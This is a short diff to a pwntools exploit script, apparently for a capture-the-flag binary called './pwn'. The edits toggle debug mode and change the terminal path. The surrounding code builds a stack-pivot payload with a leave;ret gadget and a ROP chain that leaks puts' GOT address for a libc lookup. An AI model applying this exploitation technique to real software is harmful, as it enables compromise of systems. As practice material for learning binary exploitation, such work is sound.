@@ -2,12 +2,12 @@ from pwn import *
 from pwn import p64,u64
 from LibcSearcher import *
 
-debug = 0
+debug = 1
 gdb_is = 0
 # context(arch='i386',os = 'linux')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
-    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
+    context.terminal = ['wt.exe','nt','Ubuntu','-c']
     if not gdb_is:
         r = process("./pwn")
     
@@ -27,6 +27,7 @@ main_addr = 0x00401264
 leave_ret = 0x0040124B
 
 elf = ELF('./pwn')
+
 
 payload = b'A'* 0x30 + p64(stack-8) + p64(leave_ret)  
 r.sendafter(b'again!\n',p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(ret))
